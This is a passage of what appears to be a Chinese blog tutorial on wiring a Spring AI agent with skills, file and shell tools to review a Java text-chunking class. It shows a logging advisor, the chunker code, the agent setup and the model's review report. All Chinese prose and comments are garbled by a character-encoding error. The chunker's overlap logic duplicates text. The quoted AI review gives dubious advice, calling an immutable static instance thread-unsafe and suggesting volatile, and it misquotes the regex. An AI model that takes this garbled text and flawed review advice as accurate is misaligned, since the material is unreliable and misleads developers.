            <span class="hljs-type">ToolResponseMessage</span> <span class="hljs-variable">toolResponseMessage</span> <span class="hljs-operator">=</span> (ToolResponseMessage) lastMessage;
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> toolResponse : toolResponseMessage.getResponses()) {
                <span class="hljs-type">var</span> <span class="hljs-variable">tr</span> <span class="hljs-operator">=</span> toolResponse.name() + <span class="hljs-string">": "</span> + first(toolResponse.responseData(), <span class="hljs-number">1000</span>);
                sb.append(<span class="hljs-string">"\n - TOOL-RESPONSE: "</span>).append(tr);
            }
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lastMessage.getMessageType() == MessageType.USER) {
            <span class="hljs-keyword">if</span> (StringUtils.hasText(lastMessage.getText())) {
                sb.append(<span class="hljs-string">"\n - TEXT: "</span>).append(first(lastMessage.getText(), <span class="hljs-number">1000</span>));
            }
        }

        System.out.println(<span class="hljs-string">"before: "</span> + sb);
        <span class="hljs-keyword">return</span> chatClientRequest;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ChatClientResponse <span class="hljs-title function_">after</span><span class="hljs-params">(ChatClientResponse chatClientResponse, AdvisorChain advisorChain)</span> {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">"\nASSISTANT: "</span>);

        <span class="hljs-keyword">if</span> (chatClientResponse.chatResponse() == <span class="hljs-literal">null</span> || chatClientResponse.chatResponse().getResults() == <span class="hljs-literal">null</span>) {
            sb.append(<span class="hljs-string">" No chat response "</span>);
            System.out.println(<span class="hljs-string">"after: "</span> + sb);
            <span class="hljs-keyword">return</span> chatClientResponse;
        }

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> generation : chatClientResponse.chatResponse().getResults()) {
            <span class="hljs-type">var</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> generation.getOutput();
            <span class="hljs-keyword">if</span> (message.getToolCalls() != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> toolCall : message.getToolCalls()) {
                    sb.append(<span class="hljs-string">"\n - TOOL-CALL: "</span>)
                            .append(toolCall.name())
                            .append(<span class="hljs-string">" ("</span>)
                            .append(toolCall.arguments())
                            .append(<span class="hljs-string">")"</span>);
                }
            }

            <span class="hljs-keyword">if</span> (message.getText() != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">if</span> (StringUtils.hasText(message.getText())) {
                    sb.append(<span class="hljs-string">"\n - TEXT: "</span>).append(first(message.getText(), <span class="hljs-number">1200</span>));
                }
            }
        }

        System.out.println(<span class="hljs-string">"after: "</span> + sb);
        <span class="hljs-keyword">return</span> chatClientResponse;
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">first</span><span class="hljs-params">(String text, <span class="hljs-type">int</span> n)</span> {
        <span class="hljs-keyword">if</span> (text.length() &lt;= n) {
            <span class="hljs-keyword">return</span> text;
        }
        <span class="hljs-keyword">return</span> text.substring(<span class="hljs-number">0</span>, n) + <span class="hljs-string">"..."</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Builder <span class="hljs-title function_">builder</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Builder</span> {

        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

        <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">showSystemMessage</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;

        <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">showAvailableTools</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;

        <span class="hljs-keyword">public</span> Builder <span class="hljs-title function_">order</span><span class="hljs-params">(<span class="hljs-type">int</span> order)</span> {
            <span class="hljs-built_in">this</span>.order = order;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }

        <span class="hljs-keyword">public</span> Builder <span class="hljs-title function_">showSystemMessage</span><span class="hljs-params">(<span class="hljs-type">boolean</span> showSystemMessage)</span> {
            <span class="hljs-built_in">this</span>.showSystemMessage = showSystemMessage;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }

        <span class="hljs-keyword">public</span> Builder <span class="hljs-title function_">showAvailableTools</span><span class="hljs-params">(<span class="hljs-type">boolean</span> showAvailableTools)</span> {
            <span class="hljs-built_in">this</span>.showAvailableTools = showAvailableTools;
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
        }

        <span class="hljs-keyword">public</span> MyLoggingAdvisor <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
            <span class="hljs-type">MyLoggingAdvisor</span> <span class="hljs-variable">advisor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyLoggingAdvisor</span>(<span class="hljs-built_in">this</span>.order, <span class="hljs-built_in">this</span>.showSystemMessage,
                    <span class="hljs-built_in">this</span>.showAvailableTools);
            <span class="hljs-keyword">return</span> advisor;
        }
    }
}
</code></pre>
<h3 data-id="heading-7">2.2 å‡†å¤‡ç”¨äºè¯„å®¡çš„ä»£ç </h3>
<p>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FNHqLJbos-_nrxNNmhg7IBQ" target="_blank" title="https://mp.weixin.qq.com/s/NHqLJbos-_nrxNNmhg7IBQ" ref="nofollow noopener noreferrer">å®æˆ˜ | é›¶åŸºç¡€æ­å»ºçŸ¥è¯†åº“é—®ç­”æœºå™¨äººï¼šåŸºäºSpringAI+RAGçš„å®Œæ•´å®ç°</a> ä¸­çš„ä»£ç åˆ†å—çš„å†…å®¹ä½œä¸ºå¾…è¯„å®¡çš„å†…å®¹ï¼Œçœ‹ä¸‹è¿™æ®µç®€å•çš„æ–‡æœ¬åˆ†å—å·¥å…·ä¼šè¯„å®¡å‡ºä»€ä¹ˆå†…å®¹</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.git.hui.springai.app.demo;

<span class="hljs-keyword">import</span> org.springframework.ai.document.Document;

<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * æ–‡æ¡£åˆ†å—å·¥å…·ç±»
 * å°†é•¿æ–‡æ¡£åˆ†å‰²æˆè¾ƒå°çš„å—ï¼Œä»¥ä¾¿æ›´å¥½åœ°è¿›è¡Œå‘é‡åŒ–å’Œæ£€ç´¢
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentChunker</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> maxChunkSize;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> overlapSize;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">DocumentChunker</span> <span class="hljs-variable">DEFAULT_CHUNKER</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DocumentChunker</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DocumentChunker</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>(<span class="hljs-number">500</span>, <span class="hljs-number">50</span>); <span class="hljs-comment">// é»˜è®¤å€¼ï¼šæœ€å¤§å—å¤§å°500ä¸ªå­—ç¬¦ï¼Œé‡å 50ä¸ªå­—ç¬¦</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DocumentChunker</span><span class="hljs-params">(<span class="hljs-type">int</span> maxChunkSize, <span class="hljs-type">int</span> overlapSize)</span> {
        <span class="hljs-built_in">this</span>.maxChunkSize = maxChunkSize;
        <span class="hljs-built_in">this</span>.overlapSize = overlapSize;
    }
    
    <span class="hljs-comment">/**
     * å°†æ–‡æ¡£åˆ†å‰²æˆå—
     * 
     * <span class="hljs-doctag">@param</span> document è¾“å…¥æ–‡æ¡£
     * <span class="hljs-doctag">@return</span> åˆ†å‰²åçš„æ–‡æ¡£å—åˆ—è¡¨
     */</span>
    <span class="hljs-keyword">public</span> List&lt;Document&gt; <span class="hljs-title function_">chunkDocument</span><span class="hljs-params">(Document document)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> document.getText();
        <span class="hljs-keyword">if</span> (content == <span class="hljs-literal">null</span> || content.trim().isEmpty()) {
            <span class="hljs-keyword">return</span> List.of(document);
        }
        
        List&lt;String&gt; chunks = splitText(content);
        List&lt;Document&gt; chunkedDocuments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; chunks.size(); i++) {
            <span class="hljs-type">String</span> <span class="hljs-variable">chunk</span> <span class="hljs-operator">=</span> chunks.get(i);
            <span class="hljs-type">String</span> <span class="hljs-variable">chunkId</span> <span class="hljs-operator">=</span> document.getId() + <span class="hljs-string">"_chunk_"</span> + i;
            
            <span class="hljs-comment">// åˆ›å»ºæ–°çš„æ–‡æ¡£å—ï¼Œä¿ç•™åŸå§‹æ–‡æ¡£çš„å…ƒæ•°æ®</span>
            <span class="hljs-type">Document</span> <span class="hljs-variable">chunkDoc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Document</span>(chunkId, chunk, <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.HashMap&lt;&gt;(document.getMetadata()));
            
            <span class="hljs-comment">// æ·»åŠ å—ç›¸å…³çš„å…ƒæ•°æ®</span>
            chunkDoc.getMetadata().put(<span class="hljs-string">"chunk_index"</span>, i);
            chunkDoc.getMetadata().put(<span class="hljs-string">"total_chunks"</span>, chunks.size());
            chunkDoc.getMetadata().put(<span class="hljs-string">"original_document_id"</span>, document.getId());
            
            chunkedDocuments.add(chunkDoc);
        }
        
        <span class="hljs-keyword">return</span> chunkedDocuments;
    }
    
    <span class="hljs-comment">/**
     * å°†æ–‡æœ¬åˆ†å‰²æˆå—
     * 
     * <span class="hljs-doctag">@param</span> text è¾“å…¥æ–‡æœ¬
     * <span class="hljs-doctag">@return</span> åˆ†å‰²åçš„æ–‡æœ¬å—åˆ—è¡¨
     */</span>
    <span class="hljs-keyword">private</span> List&lt;String&gt; <span class="hljs-title function_">splitText</span><span class="hljs-params">(String text)</span> {
        List&lt;String&gt; chunks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-comment">// æŒ‰å¤šç§åˆ†éš”ç¬¦åˆ†å‰²ï¼Œä¼˜å…ˆåœ¨è¯­ä¹‰è¾¹ç•Œå¤„åˆ†å‰²ï¼ˆåŒ…æ‹¬ä¸­æ–‡å¥å·ã€é—®å·ã€æ„Ÿå¹å·ç­‰ï¼‰</span>
        String[] sentences = text.split(<span class="hljs-string">"(?&lt;=ã€‚)|(?&lt;=ï¼)|(?&lt;=!)|(?&lt;=ï¼Ÿ)|(?&lt;=\\?)|(?&lt;=\\n\\n)"</span>);
        
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">currentChunk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        
        <span class="hljs-keyword">for</span> (String sentence : sentences) {
            <span class="hljs-comment">// è·³è¿‡ç©ºå¥å­</span>
            <span class="hljs-keyword">if</span> (sentence.trim().isEmpty()) {
                <span class="hljs-keyword">continue</span>;
            }
            
            <span class="hljs-comment">// å¦‚æœå½“å‰å—åŠ ä¸Šæ–°å¥å­ä¸è¶…è¿‡æœ€å¤§å¤§å°ï¼Œå°±æ·»åŠ åˆ°å½“å‰å—</span>
            <span class="hljs-keyword">if</span> (currentChunk.length() + sentence.length() &lt;= maxChunkSize) {
                <span class="hljs-keyword">if</span> (currentChunk.length() &gt; <span class="hljs-number">0</span>) {
                    currentChunk.append(sentence);
                } <span class="hljs-keyword">else</span> {
                    currentChunk.append(sentence);
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// å¦‚æœå½“å‰å—ä¸ºç©ºï¼Œä½†æ˜¯å•ä¸ªå¥å­å¤ªé•¿ï¼Œéœ€è¦å¼ºåˆ¶åˆ†å‰²</span>
                <span class="hljs-keyword">if</span> (currentChunk.length() == <span class="hljs-number">0</span>) {
                    List&lt;String&gt; subChunks = forceSplit(sentence, maxChunkSize);
                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; subChunks.size(); i++) {
                        <span class="hljs-type">String</span> <span class="hljs-variable">subChunk</span> <span class="hljs-operator">=</span> subChunks.get(i);
                        <span class="hljs-comment">// å¦‚æœä¸æ˜¯æœ€åä¸€ä¸ªå­å—ï¼Œæ·»åŠ åˆ°å½“å‰å—å¹¶ä¿å­˜</span>
                        <span class="hljs-keyword">if</span> (i &lt; subChunks.size() - <span class="hljs-number">1</span>) {
                            chunks.add(subChunk);
                        } <span class="hljs-keyword">else</span> {
                            currentChunk.append(subChunk);
                        }
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// ä¿å­˜å½“å‰å—</span>
                    chunks.add(currentChunk.toString());
                    <span class="hljs-comment">// å¼€å§‹æ–°å—ï¼ŒåŒ…å«é‡å éƒ¨åˆ†</span>
                    currentChunk = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
                    
                    <span class="hljs-comment">// æ·»åŠ é‡å éƒ¨åˆ†ï¼Œå¦‚æœå¥å­é•¿åº¦å¤§äºé‡å å¤§å°ï¼Œåˆ™åªå–æœ«å°¾éƒ¨åˆ†</span>
                    <span class="hljs-keyword">if</span> (sentence.length() &gt; overlapSize) {
                        <span class="hljs-type">String</span> <span class="hljs-variable">overlap</span> <span class="hljs-operator">=</span> sentence.substring(Math.max(<span class="hljs-number">0</span>, sentence.length() - overlapSize));
                        currentChunk.append(overlap);
                        currentChunk.append(sentence);
                    } <span class="hljs-keyword">else</span> {
                        currentChunk.append(sentence);
                    }
                }
            }
        }
        
        <span class="hljs-comment">// æ·»åŠ æœ€åä¸€ä¸ªå—</span>
        <span class="hljs-keyword">if</span> (currentChunk.length() &gt; <span class="hljs-number">0</span>) {
            chunks.add(currentChunk.toString());
        }
        
        <span class="hljs-keyword">return</span> chunks;
    }
    
    <span class="hljs-comment">/**
     * å¼ºåˆ¶å°†é•¿æ–‡æœ¬åˆ†å‰²æˆæŒ‡å®šå¤§å°çš„å—
     * 
     * <span class="hljs-doctag">@param</span> text è¾“å…¥æ–‡æœ¬
     * <span class="hljs-doctag">@param</span> maxSize æœ€å¤§å—å¤§å°
     * <span class="hljs-doctag">@return</span> åˆ†å‰²åçš„æ–‡æœ¬å—åˆ—è¡¨
     */</span>
    <span class="hljs-keyword">private</span> List&lt;String&gt; <span class="hljs-title function_">forceSplit</span><span class="hljs-params">(String text, <span class="hljs-type">int</span> maxSize)</span> {
        List&lt;String&gt; chunks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (start &lt; text.length()) {
            <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> Math.min(start + maxSize, text.length());
            <span class="hljs-type">String</span> <span class="hljs-variable">chunk</span> <span class="hljs-operator">=</span> text.substring(start, end);
            chunks.add(chunk);
            start = end;
        }
        
        <span class="hljs-keyword">return</span> chunks;
    }
    
    <span class="hljs-comment">/**
     * å°†å¤šä¸ªæ–‡æ¡£åˆ†åˆ«åˆ†å‰²æˆå—
     * 
     * <span class="hljs-doctag">@param</span> documents è¾“å…¥æ–‡æ¡£åˆ—è¡¨
     * <span class="hljs-doctag">@return</span> åˆ†å‰²åçš„æ–‡æ¡£å—åˆ—è¡¨
     */</span>
    <span class="hljs-keyword">public</span> List&lt;Document&gt; <span class="hljs-title function_">chunkDocuments</span><span class="hljs-params">(List&lt;Document&gt; documents)</span> {
        List&lt;Document&gt; allChunks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">for</span> (Document document : documents) {
            allChunks.addAll(chunkDocument(document));
        }
        
        <span class="hljs-keyword">return</span> allChunks;
    }
}
</code></pre>
<h3 data-id="heading-8">2.3 æ ¸å¿ƒå®ç°</h3>
<p>é…ç½®Agentå®ç°ä»£ç è¯„å®¡</p>
<p><strong>Beanå®šä¹‰ä¸ä¾èµ–æ³¨å…¥</strong></p>
<ul>
<li>CommandLineRunner: Springå¯åŠ¨åè‡ªåŠ¨æ‰§è¡Œçš„æ¥å£</li>
<li>ChatClient.Builder: ç”¨äºæ„å»ºèŠå¤©å®¢æˆ·ç«¯</li>
<li>@Value("${agent.skills.dirs:Unknown}"): æ³¨å…¥é…ç½®å±æ€§ï¼Œè·å–æŠ€èƒ½ç›®å½•èµ„æºåˆ—è¡¨</li>
</ul>
<p><strong>ChatClienté…ç½®é“¾</strong></p>
<ul>
<li>ç³»ç»Ÿæç¤ºè¯é…ç½®ï¼š</li>
<li>æŠ€èƒ½å·¥å…·é…ç½®ï¼š
<ul>
<li>SkillsTool.builder().addSkillsResources(agentSkillsDirs).build(): åŠ¨æ€åŠ è½½é¢„å®šä¹‰çš„æŠ€èƒ½èµ„æº</li>
<li>FileSystemTools.builder().build(): æä¾›æ–‡ä»¶ç³»ç»Ÿè®¿é—®èƒ½åŠ›</li>
<li>ShellTools.builder().build(): æä¾›å‘½ä»¤è¡Œæ‰§è¡Œèƒ½åŠ›</li>
</ul>
</li>
<li>Advisoré…ç½®:
<ul>
<li>ToolCallAdvisor.builder().build(): å¤„ç†å·¥å…·è°ƒç”¨é€»è¾‘</li>
<li>MyLoggingAdvisor.builder().showAvailableTools(false).showSystemMessage(false).build(): è‡ªå®šä¹‰æ—¥å¿—è®°å½•ï¼Œéšè—å·¥å…·å’Œç³»ç»Ÿæ¶ˆæ¯è¯¦æƒ…</li>
</ul>
</li>
</ul>
<p><strong>ä»£ç è¯„å®¡æ‰§è¡Œæµç¨‹</strong></p>
<p>è¯·æ±‚æ‰§è¡Œ</p>
<ul>
<li>prompt(): æ„å»ºæç¤ºè¯</li>
<li>.call(): å‘èµ·AIè¯·æ±‚</li>
<li>.content(): è·å–è¿”å›ç»“æœ</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Bean</span>
CommandLineRunner <span class="hljs-title function_">commandLineRunner</span><span class="hljs-params">(ChatClient.Builder chatClientBuilder,
                                    <span class="hljs-meta">@Value("${agent.skills.dirs:Unknown}")</span> List&lt;Resource&gt; agentSkillsDirs)</span> <span class="hljs-keyword">throws</span> IOException {

    <span class="hljs-keyword">return</span> args -&gt; {

        <span class="hljs-type">ChatClient</span> <span class="hljs-variable">chatClient</span> <span class="hljs-operator">=</span> chatClientBuilder <span class="hljs-comment">// @formatter:off</span>
                .defaultSystem(<span class="hljs-string">"å§‹ç»ˆè¿ç”¨ç°æœ‰æŠ€èƒ½ååŠ©ç”¨æˆ·æ»¡è¶³å…¶è¦æ±‚."</span>)

                <span class="hljs-comment">// Skills tool</span>
                .defaultToolCallbacks(SkillsTool.builder().addSkillsResources(agentSkillsDirs).build())
                <span class="hljs-comment">// æ”¯æŒè¯»å–ç³»ç»Ÿæ–‡ä»¶å†…å®¹ï¼Œç”¨äºè¯»å–æˆ‘ä»¬éœ€è¦è¯„å®¡çš„ä»£ç </span>
                .defaultTools(FileSystemTools.builder().build())
                <span class="hljs-comment">// æ”¯æŒæ‰§è¡Œè„šæœ¬ï¼Œå¦‚æœskillsä¸­å­˜åœ¨scriptï¼Œé‚£ä¹ˆè¿™äº›è„šæœ¬çš„æ‰§è¡Œï¼Œé çš„å°±æ˜¯å®ƒ</span>
                .defaultTools(ShellTools.builder().build())

                .defaultAdvisors(
                        <span class="hljs-comment">// Tool Calling advisor</span>
                        ToolCallAdvisor.builder().build(),
                        <span class="hljs-comment">// Custom logging advisor</span>
                        MyLoggingAdvisor.builder()
                                .showAvailableTools(<span class="hljs-literal">false</span>)
                                .showSystemMessage(<span class="hljs-literal">false</span>)
                                .build())
                .build();
        <span class="hljs-comment">// @formatter:on</span>

        <span class="hljs-type">var</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> chatClient
                <span class="hljs-comment">// ä¸‹é¢å…·ä½“çš„ä»£ç ä½ç½®ï¼Œè¯·æ ¹æ®å®é™…çš„ä½ç½®è¿›è¡Œæ›¿æ¢</span>
                .prompt(<span class="hljs-string">"""
                        æŒ‰ç…§æœ€ä½³å®é™…çš„æ–¹å¼ï¼Œè¯„å®¡ä¸‹é¢çš„ä»£ç å®ç°:

                         D:\\Workspace\\hui\\project\\spring-ai-demo\\v2\\T01-agentic-skills-simple-design\\src\\main\\java\\com\\git\\hui\\springai\\app\\demo\\DocumentChunker.java
                         """</span>)
                .call()
                .content();

        System.out.println(<span class="hljs-string">"The Answer: "</span> + answer);
    };
}
</code></pre>
<h3 data-id="heading-9">2.4 æ‰§è¡Œæ¼”ç¤º</h3>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯åŠ¨é¡¹ç›®ï¼ŒéªŒè¯ä¸€ä¸‹æ•ˆæœå¦‚ä½•ï¼ˆåœ¨å¯åŠ¨å‘½ä»¤è¡Œå‚æ•°ä¸­ï¼Œé…ç½®ä¸Šå¤§æ¨¡å‹çš„api-keyï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ymlé…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®ï¼‰</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">T01Application</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        SpringApplication.run(T01Application.class, args);
    }
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc72c6c5b56542f4ac76fc43dddb45fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54Gw54Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770172382&amp;x-signature=dcfVt18Om%2Bkt9RFPEBq5nUonh2o%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8dd829f7048640d8949f8aefdc516218~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54Gw54Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770172382&amp;x-signature=0%2BlE%2Fwy4ASS3V2nzUYLMztqTRTU%3D" alt="" loading="lazy"/></p>
<p>ä»ä¸Šé¢çš„æˆªå›¾ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œç³»ç»Ÿä¸å¤§æ¨¡å‹ä¹‹é—´è¿›è¡Œäº†ä¸‰è½®å¯¹è¯ï¼Œ</p>
<ol>
<li>ç¬¬ä¸€è½®ï¼š ç”¨æˆ·çš„åŸå§‹è¯‰æ±‚ -&gt; å¤§æ¨¡å‹</li>
</ol>
<ul>
<li>å¤§æ¨¡å‹è¯†åˆ«åˆ°éœ€è¦è¿›è¡Œä»£ç è¯„å®¡ï¼Œç»™ç³»ç»Ÿå“åº” <code>{"command":"code-reviewer"}</code></li>
</ul>
<ol start="2">
<li>ç¬¬äºŒè½®ï¼šç³»ç»Ÿæ¥æ”¶åˆ°å“åº”ä¹‹åï¼Œè¯»å–skillsçš„çº¦æŸè¿›è¡Œå“åº”</li>
</ol>
<ul>
<li>å¤§æ¨¡å‹è¿”å›éœ€è¦è¯»å–éœ€è¦è¯„å®¡çš„ä»£ç å†…å®¹ï¼Œå¯¹åº”çš„å“åº”ä¸º <code>{"filePath":"D:\\Workspace\\hui\\project\\spring-ai-demo\\v2\\T01-agentic-skills-simple-design\\src\\main\\java\\com\\git\\hui\\springai\\app\\demo\\DocumentChunker.java"}</code></li>
</ul>
<ol start="3">
<li>ç¬¬ä¸‰è½®ï¼šç³»ç»Ÿè¯»å–ä»£ç å†…å®¹ï¼Œå‘é€ç»™å¤§æ¨¡å‹</li>
</ol>
<ul>
<li>å¤§æ¨¡å‹è¿”å›è¯„å®¡ç»“æœ</li>
</ul>
<p>ä¸‹é¢æ˜¯å®Œæ•´çš„è¿”å›æ–‡æœ¬ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥çœ‹çœ‹</p>
<pre><code class="hljs language-markdown" lang="markdown">åŸºäºå¯¹ä»£ç çš„è¯¦ç»†åˆ†æï¼Œæˆ‘ä¸ºæ‚¨æä¾›ä»¥ä¸‹ä»£ç è¯„å®¡æŠ¥å‘Šï¼š

<span class="hljs-section">## ğŸ“‹ ä»£ç è¯„å®¡æŠ¥å‘Š - DocumentChunker.java</span>

<span class="hljs-section">### âœ… <span class="hljs-strong">**ä¼˜ç‚¹**</span></span>

<span class="hljs-bullet">1.</span> <span class="hljs-strong">**åŠŸèƒ½å®Œæ•´æ€§å¼º**</span>ï¼šä»£ç å®ç°äº†å®Œæ•´çš„æ–‡æ¡£åˆ†å—åŠŸèƒ½ï¼ŒåŒ…æ‹¬ï¼š
<span class="hljs-bullet">   -</span> å•æ–‡æ¡£åˆ†å—
<span class="hljs-bullet">   -</span> æ‰¹é‡æ–‡æ¡£åˆ†å—
<span class="hljs-bullet">   -</span> æ™ºèƒ½è¯­ä¹‰è¾¹ç•Œåˆ†å‰²
<span class="hljs-bullet">   -</span> é‡å æœºåˆ¶
<span class="hljs-bullet">   -</span> é•¿æ–‡æœ¬å¼ºåˆ¶åˆ†å‰²

<span class="hljs-bullet">2.</span> <span class="hljs-strong">**è‰¯å¥½çš„æ–‡æ¡£æ³¨é‡Š**</span>ï¼šç±»å’Œæ–¹æ³•éƒ½æœ‰æ¸…æ™°çš„ä¸­æ–‡æ³¨é‡Šï¼Œè¯´æ˜äº†åŠŸèƒ½ç”¨é€”

<span class="hljs-bullet">3.</span> <span class="hljs-strong">**åˆç†çš„é»˜è®¤å€¼**</span>ï¼šæä¾›äº†åˆç†çš„é»˜è®¤å‚æ•°ï¼ˆmaxChunkSize=500, overlapSize=50ï¼‰

<span class="hljs-bullet">4.</span> <span class="hljs-strong">**å…ƒæ•°æ®ä¿ç•™**</span>ï¼šæ­£ç¡®ä¿ç•™äº†åŸå§‹æ–‡æ¡£çš„å…ƒæ•°æ®ï¼Œå¹¶æ·»åŠ äº†å—ç›¸å…³çš„å…ƒæ•°æ®

<span class="hljs-section">### âš ï¸ <span class="hljs-strong">**éœ€è¦æ”¹è¿›çš„é—®é¢˜**</span></span>

<span class="hljs-section">#### 1. <span class="hljs-strong">**çº¿ç¨‹å®‰å…¨é—®é¢˜**</span></span>

// é—®é¢˜ï¼šé™æ€å®ä¾‹ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„
public static DocumentChunker DEFAULT<span class="hljs-emphasis">_CHUNKER = new DocumentChunker();

<span class="hljs-strong">**å»ºè®®**</span>ï¼šä½¿ç”¨ `volatile` æˆ– `AtomicReference`ï¼Œæˆ–è€…ç§»é™¤é™æ€å®ä¾‹è®©ç”¨æˆ·è‡ªå·±ç®¡ç†ã€‚

#### 2. <span class="hljs-strong">**å‚æ•°éªŒè¯ä¸è¶³**</span>

// é—®é¢˜ï¼šæ„é€ å‡½æ•°æ²¡æœ‰å‚æ•°éªŒè¯
public DocumentChunker(int maxChunkSize, int overlapSize) {
    this.maxChunkSize = maxChunkSize;
    this.overlapSize = overlapSize;
}

<span class="hljs-strong">**å»ºè®®**</span>ï¼šæ·»åŠ å‚æ•°éªŒè¯ï¼Œç¡®ä¿ `maxChunkSize &gt; 0` ä¸” `overlapSize &lt; maxChunkSize`ã€‚

#### 3. <span class="hljs-strong">**æ­£åˆ™è¡¨è¾¾å¼å¤æ‚åº¦**</span>

// é—®é¢˜ï¼šæ­£åˆ™è¡¨è¾¾å¼è¿‡äºå¤æ‚ï¼Œéš¾ä»¥ç»´æŠ¤
String[] sentences = text.split("(?&lt;={ã€‚})|(?&lt;=ï¼)|(?&lt;=!)|(?&lt;=ï¼Ÿ)|(?&lt;=\\?)|(?&lt;=\\n\\n)");

<span class="hljs-strong">**å»ºè®®**</span>ï¼šæå–ä¸ºå¸¸é‡æˆ–ä½¿ç”¨æ›´æ¸…æ™°çš„æ–¹å¼å¤„ç†å¤šè¯­è¨€åˆ†éš”ç¬¦ã€‚

#### 4. <span class="hljs-strong">**æ€§èƒ½ä¼˜åŒ–ç©ºé—´**</span>

// é—®é¢˜ï¼šStringBuilderæ“ä½œå¯ä»¥ä¼˜åŒ–
